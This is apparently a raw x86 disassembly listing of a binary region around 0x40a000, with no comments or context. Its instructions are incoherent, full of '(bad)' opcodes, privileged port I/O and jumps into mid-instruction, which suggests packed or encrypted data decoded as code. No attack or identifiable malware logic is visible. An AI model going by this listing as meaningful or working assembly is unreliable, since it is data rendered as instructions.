  40a02e:	sbb    bl,BYTE PTR [ebx-0xc480001]
  40a034:	adc    WORD PTR [esi-0x7f8bfc98],0x4
  40a03c:	ins    BYTE PTR es:[edi],dx
  40a03d:	xor    ah,BYTE PTR [edx+0x6f75745c]
  40a043:	xchg   esp,eax
  40a044:	cmc    
  40a045:	leave  
  40a046:	hlt    
  40a047:	not    edx
  40a049:	arpl   WORD PTR [si+0x64],bx
  40a04d:	mov    esi,0x7ede793
  40a052:	retf   
  40a053:	mov    ds:0xc4d4ff6b,al
  40a058:	inc    edi
  40a059:	(bad)  
  40a05a:	int3   
  40a05b:	mov    edi,0xf8ea
	...
  40a06c:	add    BYTE PTR [ecx+0x36ff039d],dl
  40a072:	pusha  
  40a073:	imul   ebx,DWORD PTR [ebp-0x57],0x37
  40a077:	je     0x40a0c9
  40a079:	cmp    ebx,DWORD PTR [ebp+0x3]
  40a07c:	out    dx,eax
  40a07d:	in     eax,0x5
  40a07f:	mov    ecx,0x10fd1674
  40a084:	call   0x47b9:0x6b166e8b
  40a08b:	push   cs
  40a08c:	je     0x40a089
  40a08e:	add    BYTE PTR [edx+0x746f7cc2],bh
  40a094:	pop    es
  40a095:	mov    esi,DWORD PTR [ecx]
  40a097:	and    esi,DWORD PTR [esp+ebp*2-0x2b]
  40a09b:	add    BYTE PTR [ecx],0x63
  40a09e:	pop    esi
  40a09f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0a0:	aam    0x5d
  40a0a2:	clc    
  40a0a3:	lock pop ebx
  40a0a5:	fistp  DWORD PTR [ebp-0x2a]
  40a0a8:	jae    0x40a0e5
  40a0aa:	jl     0x40a053
  40a0ac:	jae    0x40a0f2
  40a0ae:	cmp    al,0xab
  40a0b0:	cld    
  40a0b1:	cmp    al,0xd9
  40a0b3:	jno    0x40a115
  40a0b5:	xor    al,0xf8
  40a0b7:	in     al,0x5b
  40a0b9:	sbb    bh,BYTE PTR [ebx]
  40a0bb:	scas   al,BYTE PTR es:[edi]
  40a0bc:	jae    0x40a116
  40a0be:	inc    ebp
  40a0bf:	sbb    eax,0xdb508b0e
  40a0c4:	les    edx,FWORD PTR [esi+edi*4]
  40a0c7:	adc    dl,0x1a
  40a0ca:	outs   dx,BYTE PTR ds:[esi]
  40a0cb:	mov    ss,esp
  40a0cd:	xchg   esp,eax
  40a0ce:	outs   dx,BYTE PTR ds:[esi]
  40a0cf:	cld    
  40a0d0:	sti    
	...
  40a0dd:	add    BYTE PTR [eax],al
  40a0df:	add    BYTE PTR [ecx+eiz*8],al
  40a0e2:	jge    0x40a157
  40a0e4:	hlt    
  40a0e5:	pop    esp
  40a0e6:	adc    eax,0xa06dec4a
  40a0eb:	inc    esi
  40a0ec:	pop    ebx
  40a0ed:	add    eax,0x81cf7ebc
  40a0f2:	and    eax,0x56054964
  40a0f7:	stc    
  40a0f8:	pop    esp
  40a0f9:	outs   dx,BYTE PTR ds:[esi]
  40a0fa:	aam    0xff
  40a0fc:	lds    esi,FWORD PTR [edi]
  40a0fe:	push   cs
  40a0ff:	sbb    eax,0xdb510522
  40a104:	stos   DWORD PTR es:[edi],eax
  40a105:	ins    DWORD PTR es:[edi],dx
  40a106:	add    BYTE PTR [esi],dh
  40a108:	cs enter 0xc3f3,0x60
  40a10d:	outs   dx,BYTE PTR ds:[esi]
  40a10e:	jne    0x40a10d
  40a110:	adc    eax,edi
  40a112:	or     ebx,DWORD PTR [esi]
  40a114:	pop    edx
  40a115:	sub    DWORD PTR es:[eax+0x20415d60],ebp
  40a11c:	adc    BYTE PTR [esi-0x77],ch
  40a11f:	lods   al,BYTE PTR ds:[esi]
  40a120:	or     al,0xdb
  40a122:	(bad)  
  40a123:	std    
  40a124:	jnp    0x40a13b
  40a126:	(bad)  
  40a127:	jl     0x40a195
  40a129:	outs   dx,BYTE PTR ds:[esi]
  40a12a:	xor    eax,0xffc447c6
  40a12f:	sar    BYTE PTR [ebp+0x3e],1
  40a132:	(bad)  
  40a133:	(bad)  
  40a135:	ret    0x64f7
  40a138:	sbb    esp,DWORD PTR [ebp+0x50]
  40a13b:	into   
  40a13c:	dec    ebx
  40a13d:	adc    edi,edi
  40a13f:	cmp    al,0x63
  40a141:	ins    BYTE PTR es:[edi],dx
  40a142:	xor    eax,0x6
	...
  40a153:	push   esi
  40a154:	(bad)  
  40a155:	inc    eax
  40a157:	push   ebp
  40a158:	jmp    FWORD PTR ds:[esi+0x13efc2a7]
  40a15f:	ins    BYTE PTR es:[di],dx
  40a161:	jne    0x40a12c
  40a163:	xchg   ecx,eax
  40a164:	repnz or edx,DWORD PTR [esi+0x2829244b]
  40a16b:	pop    edi
  40a16c:	pop    ebp
  40a16d:	std    
  40a16e:	mov    cl,0x71
  40a170:	ins    BYTE PTR es:[edi],dx
  40a171:	mov    DWORD PTR [ebx+eax*4],esp
  40a174:	jp     0x40a1bb
  40a176:	mov    DWORD PTR [eax],edx
  40a178:	ins    BYTE PTR es:[edi],dx
  40a179:	jne    0x40a140
  40a17b:	jno    0x40a16f
  40a17d:	or     esp,DWORD PTR [esi-0x65]
  40a180:	and    al,0x29
  40a182:	test   al,0x60
  40a184:	pop    ebp
  40a185:	in     eax,0x21
  40a187:	push   ecx
  40a188:	ins    BYTE PTR es:[edi],dx
  40a189:	mov    DWORD PTR [esp+edi*1+0x26007d88],esp
  40a190:	or     BYTE PTR [edi],cl
  40a192:	test   BYTE PTR [esi],cl
  40a194:	or     BYTE PTR [eax],al
  40a196:	add    BYTE PTR [ecx],bh
  40a198:	jne    0x40a191
  40a19a:	add    BYTE PTR [ebp-0x75ff757c],al
  40a1a0:	or     BYTE PTR [ebx+0xf086e7d],al
  40a1a6:	test   dl,bh
  40a1a8:	pop    es
  40a1a9:	add    BYTE PTR [eax],al
  40a1ab:	push   ebp
  40a1ac:	ins    DWORD PTR es:[edi],dx
  40a1ad:	daa    
  40a1ae:	(bad)  
  40a1af:	jmp    FWORD PTR [edi-0x19]
  40a1b2:	sub    cl,BYTE PTR [eax-0x9]
  40a1b5:	(bad)  
  40a1b6:	inc    DWORD PTR [eax]
	...
  40a1c4:	add    BYTE PTR [eax],al
  40a1c6:	out    dx,eax
  40a1c7:	(bad)  
  40a1c9:	jne    0x40a14d
  40a1cb:	rol    BYTE PTR [eax-0x109ba3e],1
  40a1d1:	jne    0x40a215
  40a1d3:	div    BYTE PTR [eax+ecx*1+0x22]
  40a1d7:	outs   dx,DWORD PTR ds:[esi]
  40a1d8:	sar    edi,0x15
  40a1db:	div    BYTE PTR [esp+esi*8+0x25]
  40a1df:	je     0x40a1e8
  40a1e1:	call   0x3f6577
  40a1e6:	mov    ebx,0x3a13275c
  40a1eb:	in     eax,0xbd
  40a1ed:	jne    0x40a206
  40a1ef:	cmc    
  40a1f0:	je     0x40a1e2
  40a1f2:	cmc    
  40a1f3:	jae    0x40a1fc
  40a1f5:	call   0x3f6547
  40a1fa:	loope  0x40a202
  40a1fc:	push   DWORD PTR [ebp-0x2e]
  40a1ff:	cmc    
  40a200:	je     0x40a1f2
  40a202:	jne    0x40a278
  40a204:	pop    es
  40a205:	call   0x3f641b
  40a20a:	jne    0x40a280
  40a20c:	jmp    0x40a20d
  40a20e:	mov    edi,0x883ce76f
  40a213:	idiv   dh
  40a215:	and    DWORD PTR [ebx+0x51],0x67
  40a219:	add    BYTE PTR [edi+0x71],cl
  40a21c:	test   BYTE PTR [ebp-0x3d],bh
  40a21f:	pop    ecx
  40a220:	test   BYTE PTR [esi],0xe8
  40a223:	mov    al,ds:0x3373ff67
  40a228:	test   DWORD PTR [edi],0x0
	...
  40a236:	add    BYTE PTR [eax],al
  40a238:	add    BYTE PTR [ebx-0x6300bce4],bh
  40a23e:	push   ss
  40a23f:	(bad)  
  40a240:	imul   esp,DWORD PTR [ebx+0xb],0xc87b07f7
  40a247:	inc    edx
  40a248:	inc    DWORD PTR [edx+edi*8+0x398bf3f6]
  40a24f:	inc    esi
  40a250:	push   DWORD PTR [edx+ebp*2-0xa]
  40a254:	sti    
  40a255:	jnp    0x40a2a8
  40a257:	inc    esi
  40a258:	jmp    DWORD PTR [edx+ebx*2-0xa]
  40a25c:	test   DWORD PTR [ebx+0x69],0x4c54ff46
  40a263:	imul   bh
  40a265:	cmp    esp,DWORD PTR [ecx+0x46]
  40a268:	inc    DWORD PTR [esp+edi*1-0xa]
  40a26c:	jmp    0x40a2b9
  40a26e:	pop    ecx
  40a26f:	inc    esi
  40a270:	push   DWORD PTR [esp+ebp*4]
  40a273:	mul    bl
  40a275:	cmp    esi,DWORD PTR [ecx-0x59db00b9]
  40a27b:	inc    ebp
  40a27c:	and    al,0x63
  40a27e:	sub    DWORD PTR [ebp-0x14],edi
  40a281:	loop   0x40a223
  40a283:	jae    0x40a27c
  40a285:	or     al,0x94
  40a287:	fist   DWORD PTR [edx]
  40a289:	arpl   bx,bp
  40a28b:	mov    al,0x68
  40a28d:	jo     0x40a23e
  40a28f:	ret    0x7cff
  40a292:	adc    al,0x35
  40a294:	inc    ecx
  40a295:	arpl   WORD PTR [eiz*8-0x24a35dce],ax
  40a29c:	pop    eax
	...
  40a2a9:	add    BYTE PTR [eax],al
  40a2ab:	add    BYTE PTR [eax+0x4b03a805],dl
  40a2b1:	rcr    DWORD PTR [ecx],1
  40a2b3:	ret    
  40a2b4:	int3   
  40a2b5:	loop   0x40a26d
  40a2b7:	xor    al,0x22
  40a2b9:	add    eax,0x6a68f64e
  40a2be:	mov    esp,0x3edcbcfb
  40a2c3:	jo     0x40a271
  40a2c5:	fstp   st(1)
  40a2c7:	add    esi,DWORD PTR [ebx+ebp*4-0x3baf483f]
  40a2ce:	call   0xa87768ae
  40a2d3:	add    edi,ebx
  40a2d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a2d6:	fcmovb st,st(2)
  40a2d8:	test   dl,ah
  40a2da:	popa   
  40a2db:	xor    al,0x22
  40a2dd:	add    eax,0xc431f091
  40a2e2:	call   0xa87778c2
  40a2e7:	add    esp,DWORD PTR [eax+esi*8-0x24]
  40a2eb:	jo     0x40a2c3
  40a2ed:	std    
  40a2ee:	shr    BYTE PTR [ebx],1
  40a2f0:	push   ebp
  40a2f1:	push   0xffffffde
  40a2f3:	fdiv   QWORD PTR [eax+0x5]
  40a2f6:	(bad)  
  40a2f7:	scas   al,BYTE PTR es:[edi]
  40a2f8:	mov    ebx,0x3cc51511
  40a2fd:	loop   0x40a2e8
  40a2ff:	aaa    
  40a300:	mov    ds:0x70725105,al
  40a305:	(bad)  
  40a306:	call   0x2876b7e6
  40a30b:	add    al,0x8b
  40a30d:	stos   BYTE PTR es:[edi],al
  40a30e:	fcmovb st,st(4)
	...
  40a31c:	add    BYTE PTR [eax],al
  40a31e:	add    BYTE PTR [edx+eiz*8],dl
  40a321:	xchg   DWORD PTR [ebx],esi
  40a323:	mov    ds:0x58f99605,al
  40a328:	push   0x14
  40a32a:	cld    
  40a32b:	add    al,0xf8
  40a32d:	xchg   BYTE PTR [edi-0xc],ch
  40a330:	ja     0x40a356
  40a332:	jo     0x40a2c7
  40a334:	push   0x0
  40a336:	cld    
  40a337:	in     al,0x6a
  40a339:	xor    eax,0xffc47fc6
  40a33e:	push   eax
  40a33f:	adc    BYTE PTR [ebx-0x56361700],dl
  40a345:	jne    0x40a31a
  40a347:	sbb    eax,0x60e9f7c0
  40a34c:	add    eax,0x75aa2e00
  40a351:	jmp    esi
  40a353:	pusha  
  40a354:	add    eax,0x698ae96a
  40a359:	imul   ebp,ecx,0xac8c69ba
  40a35f:	or     al,0xd5
  40a361:	mov    WORD PTR [ebx+ecx*1+0x72],fs
  40a365:	call   DWORD PTR [esi]
  40a367:	scas   eax,DWORD PTR es:[edi]
  40a368:	push   0x75
  40a36a:	adc    DWORD PTR [eax+esi*8],ecx
  40a36d:	sti    
  40a36e:	adc    esi,esi
  40a370:	xchg   edx,eax
  40a371:	add    cl,ch
  40a373:	imul   ebp,DWORD PTR [ecx-0x3af6148c],0xc67f5167
  40a37d:	jmp    ebp
  40a37f:	pop    ebx
  40a380:	std    
  40a381:	out    0x8e,eax
	...
  40a38f:	add    BYTE PTR [eax],al
  40a391:	add    BYTE PTR [ebp-0x4f9d0098],ah
  40a397:	jp     0x40a31e
  40a399:	aad    0xb5
  40a39b:	push   0x611119ff
  40a3a0:	hlt    
  40a3a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a3a2:	mov    ebp,0xb06c8968
  40a3a7:	jo     0x40a3a8
  40a3a9:	scas   al,BYTE PTR es:[edi]
  40a3aa:	lea    esi,[edx+0x68859ef0]
  40a3b0:	call   DWORD PTR [edi+ecx*1]
  40a3b3:	popa   
  40a3b4:	cmc    
  40a3b5:	xchg   edi,eax
  40a3b6:	jne    0x40a420
  40a3b8:	call   DWORD PTR [eax+esi*2+0x70]
  40a3bc:	inc    DWORD PTR [eax]
  40a3be:	(bad)  
  40a3c0:	loope  0x40a385
  40a3c2:	ins    DWORD PTR es:[edi],dx
  40a3c3:	xlat   BYTE PTR ds:[ebx]
  40a3c4:	inc    BYTE PTR [ebp+0x72]
  40a3c7:	retf   
  40a3c8:	xchg   esp,eax
  40a3c9:	call   edi
  40a3cb:	fsub   st,st(7)
  40a3cd:	das    
  40a3ce:	push   esp
  40a3cf:	add    al,0x0
  40a3d1:	leave  
  40a3d2:	js     0x40a440
  40a3d4:	call   DWORD PTR [ecx+eax*2-0x38]
  40a3d8:	add    ah,0x2e
  40a3db:	dec    esi
  40a3dc:	jmp    FWORD PTR [ecx-0x3c]
  40a3df:	xlat   BYTE PTR ds:[ebx]
  40a3e0:	je     0x40a3ea
  40a3e2:	adc    ch,bh
  40a3e4:	mov    edi,0x44e96dff
  40a3e9:	cld    
  40a3ea:	mov    ds:0x8a4132fb,al
  40a3ef:	xlat   BYTE PTR ds:[ebx]
  40a3f0:	je     0x40a3fa
  40a3f2:	jb     0x40a3a3
  40a3f4:	(bad)  
  40a3f5:	inc    DWORD PTR [eax]
	...
  40a403:	add    BYTE PTR [eax],al
  40a405:	ins    DWORD PTR es:[edi],dx
  40a406:	dec    esi
  40a407:	jmp    DWORD PTR [edi-0x3e]
  40a40a:	xor    eax,DWORD PTR [ecx+0x0]
  40a40d:	sar    bl,cl
  40a40f:	xor    al,BYTE PTR [ecx+0x7a]
  40a412:	xlat   BYTE PTR ds:[ebx]
  40a413:	xor    al,0x27
  40a415:	mov    ds:0x9ae7ff41,eax
  40a41a:	ret    0xfffe
  40a41d:	push   ecx
  40a41e:	les    esi,FWORD PTR [ebx+0xf]
  40a421:	mov    dl,BYTE PTR [ecx-0x2]
  40a424:	jne    0x40a468
  40a426:	int3   
  40a427:	xchg   esp,eax
  40a428:	cld    
  40a429:	sub    eax,0x985e7da
  40a42e:	(bad)  
  40a430:	push   0x3a
  40a432:	dec    esp
  40a433:	cdq    
  40a434:	sub    BYTE PTR [ebx+0x1],bh
  40a437:	push   0xff43192e
  40a43c:	(bad)  
  40a43d:	aaa    
  40a43e:	and    DWORD PTR [ecx],ebp
  40a440:	inc    ecx
  40a441:	cli    
  40a442:	retf   
  40a443:	test   esi,eax
  40a445:	arpl   WORD PTR [edi+0x12230b6d],cx
  40a44b:	std    
  40a44c:	dec    edi
  40a44d:	xchg   ebx,eax
  40a44e:	jg     0x40a447
  40a450:	pop    es
  40a451:	sti    
  40a452:	adc    dh,BYTE PTR [eax-0x1]
  40a455:	in     al,0x85
  40a457:	leave  
  40a458:	ret    0xd6dc
  40a45b:	fcos   
  40a45d:	cmp    al,0xb6
  40a45f:	xor    BYTE PTR [ecx+0x63],al
  40a462:	push   esi
  40a463:	or     BYTE PTR [ebx],dh
  40a465:	and    bl,BYTE PTR [esi-0x25]
  40a468:	add    DWORD PTR [eax],eax
	...
  40a476:	add    BYTE PTR [eax],al
  40a478:	arpl   WORD PTR [esi-0x7d],bx
  40a47b:	call   0xffadbc96
  40a480:	pop    eax
  40a481:	push   ds
  40a482:	clc    
  40a483:	push   cs
  40a484:	adc    ecx,DWORD PTR [esi-0x39948a94]
  40a48a:	sar    ebx,0x94
  40a48d:	push   ds
  40a48e:	pop    esp
  40a48f:	xor    ah,BYTE PTR [eax+0x636a6d06]
  40a495:	xchg   BYTE PTR [ecx-0x24a1ddd8],cl
  40a49b:	sub    eax,0x68039d30
  40a4a0:	popa   
  40a4a1:	pop    esi
  40a4a2:	add    eax,DWORD PTR [eax-0xba5685]
  40a4a8:	pop    esp
  40a4a9:	fs inc ebx
  40a4ab:	je     0x40a511
  40a4ad:	sub    al,0xd4
  40a4af:	(bad)  
  40a4b0:	(bad)  
  40a4b1:	je     0x40a50e
  40a4b3:	sbb    DWORD PTR [edi+0x50],eax
  40a4b6:	ins    BYTE PTR es:[edi],dx
  40a4b7:	call   0xffad4026
  40a4bc:	leave  
  40a4bd:	bound  ebp,QWORD PTR [ebp+esi*2+0x5b]
  40a4c1:	push   esp
  40a4c2:	jmp    0xd9f0c9c2
  40a4c7:	and    bl,BYTE PTR [edx+esi*1]
  40a4ca:	cld    
  40a4cb:	out    0x93,eax
  40a4cd:	add    eax,0xdc0c6ca5
  40a4d2:	cld    
  40a4d3:	ins    BYTE PTR es:[edi],dx
  40a4d4:	mov    ?,ebp
  40a4d6:	and    ch,0xf8
  40a4d9:	data16 mov gs,WORD PTR [eax+eax*1+0x0]
	...
  40a4ea:	add    BYTE PTR [esi+0x69],ch
  40a4ed:	xchg   dh,dh
  40a4ef:	fs pop ebp
  40a4f1:	pop    ds
  40a4f2:	inc    esp
  40a4f3:	in     al,0x66
  40a4f5:	mov    al,ds:0x14056741
  40a4fa:	jns    0x40a4c3
  40a4fc:	sub    BYTE PTR ds:0xd2ce356f,0x3
  40a503:	cmp    esi,edi
  40a505:	push   ebp
  40a506:	mul    BYTE PTR [ebp+ebx*2-0x17]
  40a50a:	inc    ebx
  40a50b:	mov    ah,0x66
  40a50d:	jo     0x40a4d5
  40a50f:	test   al,0x7a
  40a511:	hlt    
  40a512:	ret    
  40a513:	jl     0x40a4d9
  40a515:	call   0x1020392
  40a51a:	ret    
  40a51b:	xchg   esp,eax
  40a51c:	out    0xe5,al
  40a51e:	add    edx,DWORD PTR [edi]
  40a520:	repnz nop
  40a522:	es dec edi
  40a524:	(bad)  
  40a525:	call   0x740129fe
  40a52a:	add    esp,DWORD PTR [ebx-0x6]
  40a52d:	sub    bh,dh
  40a52f:	dec    ebp
  40a530:	iret   
  40a531:	adc    bl,bl
  40a533:	cwde   
  40a534:	data16 not dl
  40a537:	les    eax,FWORD PTR ds:0xdd155ce9
  40a53d:	daa    
  40a53e:	xor    BYTE PTR [edx-0x3194c6fb],ah
  40a544:	std    
  40a545:	ror    dh,0x45
  40a548:	data16 into 
  40a54a:	pop    esp
  40a54b:	fld    QWORD PTR [edx-0x3a]
  40a54e:	imul   eax,DWORD PTR [eax],0x0
	...
  40a55d:	add    BYTE PTR [ebx+0x24c4f532],bh
  40a563:	iret   
  40a564:	inc    eax
  40a566:	jo     0x40a4f8
  40a568:	add    cl,ch
  40a56a:	adc    eax,0x310674a6
  40a56f:	pop    esi
  40a570:	cmp    ch,BYTE PTR [ebp+0x1506678]
  40a576:	addr16 add eax,0xc5174fef
  40a57c:	xor    ebp,DWORD PTR [eax]
  40a57e:	addr16 aad 0xfe
  40a581:	hlt    
  40a582:	call   0x48ced1e4
  40a587:	callw  0xc29c
  40a58b:	call   WORD PTR [edx+0x66]
  40a58f:	mov    edi,0xf05f1f7f
  40a594:	stc    
  40a595:	scas   eax,DWORD PTR es:[edi]
  40a596:	inc    esp
  40a597:	xor    al,al
  40a599:	nop
  40a59a:	dec    eax
  40a59b:	inc    WORD PTR [esi+0x35]
  40a59f:	xchg   edi,eax
  40a5a0:	cmp    dh,ah
  40a5a2:	mov    bl,0x78
  40a5a4:	(bad)  
  40a5a5:	mov    esp,0xe1756604
  40a5aa:	cmp    BYTE PTR [ecx-0x3a07d941],dh
  40a5b0:	pop    ebp
  40a5b1:	xor    BYTE PTR ds:0xfdbc0001,bl
  40a5b7:	pop    eax
  40a5b8:	push   0xbe5660e9
  40a5bd:	xchg   ecx,eax
  40a5be:	test   DWORD PTR [ecx],esi
  40a5c0:	inc    ecx
  40a5c1:	jmp    0x40a5c6
	...
  40a5ce:	add    BYTE PTR [eax],al
  40a5d0:	add    cl,bh
  40a5d2:	out    dx,eax
  40a5d3:	or     esi,esi
  40a5d5:	push   ebx
  40a5d6:	or     eax,0x64c106e8
  40a5db:	call   DWORD PTR [ecx+0x66]
  40a5de:	add    eax,0xed289fef
  40a5e3:	xor    ebp,DWORD PTR [eax]
  40a5e5:	addr16 fs jne 0x40a5c6
  40a5e9:	leave  
  40a5ea:	fiadd  DWORD PTR [edi]
  40a5ec:	add    BYTE PTR [edx],dl
  40a5ee:	mov    ebx,0x21e5ffe5
  40a5f3:	ret    0xa08
  40a5f6:	ss mov ch,ah
  40a5f9:	lds    edx,FWORD PTR [ebp+0xb]
  40a5fc:	call   0x3f6d3a
  40a601:	adc    ecx,ecx
  40a603:	jae    0x40a61f
  40a605:	bound  ebx,QWORD PTR [esi+0x390a4133]
  40a60b:	out    0xd8,eax
  40a60d:	mov    edi,0x4a50feef
  40a612:	lock je 0x40a61d
  40a615:	loop   0x40a59a
  40a617:	(bad)  
  40a618:	inc    DWORD PTR [ebp-0x40]
  40a61b:	aad    0xc1
  40a61d:	inc    ebp
  40a61e:	out    dx,eax
  40a61f:	enter  0xd2c2,0x8
  40a623:	push   ebp
  40a624:	mov    esp,DWORD PTR [esi]
  40a626:	mov    eax,esp
  40a628:	cld    
  40a629:	mov    al,ds:0x25086a08
  40a62e:	push   ebp
  40a62f:	pop    es
  40a630:	call   0x405457
	...
  40a641:	add    BYTE PTR [eax],al
  40a643:	add    BYTE PTR [ebx],al
  40a645:	inc    ebp
  40a646:	sti    
  40a647:	push   0xffffff8a
  40a649:	inc    eax
  40a64a:	aas    
  40a64b:	xor    eax,0x6d6808bb
  40a650:	scas   al,BYTE PTR es:[edi]
  40a651:	dec    ecx
  40a652:	(bad)  
  40a653:	(bad)  
  40a654:	lahf   
  40a655:	daa    
  40a656:	sub    DWORD PTR [ecx-0x76],eax
  40a659:	sar    BYTE PTR [ebp+0xaef65c4],0xc0
  40a660:	out    dx,al
  40a661:	adc    edx,DWORD PTR [eax+0x68]
  40a664:	dec    ebx
  40a665:	or     bh,ch
  40a667:	mov    esi,0x874eefa
  40a66c:	xor    ch,BYTE PTR [edx+eiz*8-0x1]
  40a670:	and    eax,0x63c18dc1
  40a675:	cmp    ebp,DWORD PTR [ecx+0x6a]
  40a678:	arpl   si,ax
  40a67a:	ret    
  40a67b:	xor    al,0xa2
  40a67d:	outs   dx,BYTE PTR ds:[esi]
  40a67e:	fist   DWORD PTR [ecx-0xfbd291]
  40a684:	push   esi
  40a685:	adc    ebx,DWORD PTR [ebx]
  40a687:	inc    ecx
  40a688:	arpl   WORD PTR [esi+0x79],ax
  40a68b:	les    ecx,FWORD PTR [ebx+ebp*4]
  40a68e:	std    
  40a68f:	mov    edi,0x67d35a8f
  40a694:	bound  ebp,QWORD PTR [esi+0x58]
  40a697:	mov    esi,0x7ef9393
  40a69c:	sti    
  40a69d:	sbb    esp,DWORD PTR [ebp-0x1]
  40a6a0:	in     al,0x75
  40a6a2:	leave  
  40a6a3:	rcr    ah,0xda
  40a6a6:	(bad)  
	...
  40a6b4:	add    BYTE PTR [eax],al
  40a6b6:	add    BYTE PTR [esi+edi*8],bh
  40a6b9:	cs inc ecx
  40a6bb:	arpl   WORD PTR [esi],si
  40a6bd:	aaa    
  40a6be:	xor    al,0x22
  40a6c0:	outs   dx,BYTE PTR ds:[esi]
  40a6c1:	push   0xc3058435
  40a6c6:	(bad)  
  40a6c7:	mov    esp,0xacff3f4d
  40a6cc:	push   esi
  40a6cd:	inc    ebx
  40a6ce:	je     0x40a724
  40a6d0:	jle    0x40a6a5
  40a6d2:	(bad)  
  40a6d3:	push   ss
  40a6d4:	pop    bx
  40a6d6:	or     dl,BYTE PTR [edx+esi*1+0x2d56e869]
  40a6dd:	imul   edi,edi,0x4fdb6df9
  40a6e3:	lods   eax,DWORD PTR ss:[esi]
  40a6e5:	add    ebp,DWORD PTR [eax+0x6f]
  40a6e8:	cmp    edx,eax
  40a6ea:	jmp    FWORD PTR [ebp-0x60]
  40a6ed:	and    BYTE PTR [ecx],ch
  40a6ef:	and    ch,BYTE PTR [esi+0x5b]
  40a6f2:	ss daa 
  40a6f4:	pop    esp
  40a6f5:	push   0xf7d9230b
  40a6fa:	dec    edi
  40a6fb:	mov    bl,0x5
  40a6fd:	out    0xee,al
  40a6ff:	pop    esp
  40a700:	ins    DWORD PTR es:[edi],dx
  40a701:	leave  
  40a702:	imul   edi,DWORD PTR [ebx+eiz*2],0x6323fcc1
  40a709:	into   
  40a70a:	(bad)  [ebx+ebp*8]
  40a70d:	pop    ds
  40a70e:	das    
  40a70f:	mov    ds:0x56335105,al
  40a714:	(bad)  
  40a715:	call   0x6af582
  40a71a:	ret    
	...
  40a727:	add    BYTE PTR [eax],al
  40a729:	add    BYTE PTR [ebx+ebp*2],cl
  40a72c:	cmc    
  40a72d:	aas    
  40a72e:	add    al,0x63
  40a730:	repnz inc ebx
  40a732:	ja     0x40a746
  40a734:	cmp    esp,edx
  40a736:	cmc    
  40a737:	fsub   st,st(0)
  40a739:	pop    ebx
  40a73a:	mov    ch,0x63
  40a73c:	xchg   BYTE PTR [eax-0x5],ch
  40a73f:	fs test eax,0xd4efdc68
  40a745:	push   0x4b810d4e
  40a74a:	int    0x62
  40a74c:	data16 (bad) [edx+0x62]
  40a750:	aam    0xfb
  40a752:	les    edx,FWORD PTR [ebx+0x57]
  40a755:	push   0x6909efb4
  40a75a:	ss or  eax,0x62a53f51
  40a760:	ds push 0xee366116
  40a766:	pop    esp
  40a767:	ins    DWORD PTR es:[edi],dx
  40a768:	imul   DWORD PTR [ecx+0x4530628c]
  40a76e:	pop    edi
  40a76f:	add    eax,0x628f7cb4
  40a774:	pushf  
  40a775:	idiv   DWORD PTR [ebp+ebx*2+0x25]
  40a779:	push   0xef290e6c
  40a77e:	push   ss
  40a77f:	in     eax,dx
  40a780:	xchg   edx,eax
  40a781:	mov    cs:0xb8990005,al
  40a787:	nop
  40a788:	(bad)  
  40a789:	out    dx,al
  40a78a:	les    esi,FWORD PTR [ebp+0x394f]
	...
  40a79c:	add    BYTE PTR [edi],ah
  40a79e:	(bad)  
  40a79f:	dec    esi
  40a7a1:	add    eax,0x1e1c64ed
  40a7a6:	bound  ecx,QWORD PTR [edi-0x32]
  40a7a9:	xor    cl,BYTE PTR [edx]
  40a7ab:	call   0xffa369ca
  40a7b0:	and    DWORD PTR [edi],edi
  40a7b2:	add    eax,0xecbdc600
  40a7b7:	jae    0x40a7ad
  40a7b9:	daa    
  40a7ba:	bound  ecx,QWORD PTR [edi-0x5a]
  40a7bd:	adc    cl,BYTE PTR [edx]
  40a7bf:	call   0xffa32ba2
  40a7c4:	xor    DWORD PTR [edi],edx
  40a7c6:	add    al,0x0
  40a7c8:	jle    0x40a78f
  40a7ca:	in     al,dx
  40a7cb:	cmp    DWORD PTR [edi+ebx*1-0x2d81b09e],0x43c2e809
  40a7d6:	(bad)  
  40a7d7:	inc    DWORD PTR [ecx+0x66ffa19c]
  40a7dd:	xchg   BYTE PTR [edi+0x8],al
  40a7e0:	jmp    0x6b2d3678
  40a7e5:	and    esp,DWORD PTR [ecx+0x6a]
  40a7e8:	jmp    0xbd3fb477
  40a7ed:	test   al,0x69
  40a7ef:	jns    0x40a86d
  40a7f1:	add    al,0x62
  40a7f3:	mov    DWORD PTR [esp+edi*8-0x6dd1e612],ebp
  40a7fa:	or     eax,ebp
  40a7fc:	imul   edi,esp,0x93ff61
	...
  40a80e:	add    BYTE PTR [eax],al
  40a810:	inc    ecx
  40a811:	bound  esi,QWORD PTR [ebp-0x1f]
  40a814:	sbb    bl,bl
  40a816:	dec    BYTE PTR [esi]
  40a818:	add    al,0xef
  40a81a:	sbb    eax,DWORD PTR [eax]
  40a81c:	pop    ebp
  40a81d:	push   esp
  40a81e:	pop    es
  40a81f:	call   0x3f9012
  40a824:	dec    ebp
  40a825:	push   esi
  40a826:	sti    
  40a827:	call   edi
  40a829:	pop    esp
  40a82a:	out    0x93,eax
  40a82c:	jmp    edi
  40a82e:	dec    cl
  40a830:	or     BYTE PTR [ecx-0x1],ah
  40a833:	push   esp
  40a834:	sar    DWORD PTR [eax-0x575dff97],0x35
  40a83b:	inc    ecx
  40a83c:	cmp    bh,BYTE PTR ds:0x94b35ac
  40a842:	push   DWORD PTR ds:0x410265
  40a848:	and    bl,BYTE PTR [eax-0x3e]
  40a84b:	(bad)  
  40a84c:	mov    ebp,0xf774bf5b
  40a851:	xor    al,0xfe
  40a853:	jne    0x40a84f
  40a855:	out    0x74,eax
  40a857:	or     al,0x2a
  40a859:	call   0x9712b0d2
  40a85e:	in     al,0xff
  40a860:	pop    ebp
  40a861:	mov    esp,0xe74dbfdd
  40a866:	imul   eax,DWORD PTR [eax],0x4135a862
  40a86c:	mov    edx,0xb35ac3c
  40a871:	add    eax,0x268
	...
  40a882:	add    dl,cl
  40a884:	add    al,0x80
  40a886:	call   0x3f6ea5
  40a88b:	mov    cl,0xc4
  40a88d:	jae    0x40a8a4
  40a88f:	cli    
  40a890:	out    0x74,eax
  40a892:	adc    BYTE PTR [ebp+0x55],cl
  40a895:	or     edx,DWORD PTR [eax+0x3d]
  40a898:	push   ebp
  40a899:	pop    es
  40a89a:	call   0x3f6898
  40a89f:	push   edx
  40a8a0:	ja     0x40a861
  40a8a2:	jmp    DWORD PTR [ebx-0x9]
  40a8a5:	gs jne 0x40a8fb
